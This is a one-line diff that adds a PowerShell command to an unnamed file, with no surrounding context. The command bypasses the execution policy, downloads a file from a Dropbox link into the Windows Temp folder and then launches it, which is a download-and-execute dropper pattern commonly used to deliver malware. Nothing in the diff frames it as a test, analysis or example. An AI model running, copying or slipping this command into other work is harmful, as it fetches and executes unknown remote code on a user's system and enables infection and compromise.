@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/4edeknupk2hc1e7qaxitn/123.txt?rlkey=igox9947uyz78piuin8vqq4i8&dl=1', 'C:\Windows\Temp\123.txt'); Start-Process ('C:\Windows\Temp\123.txt')"
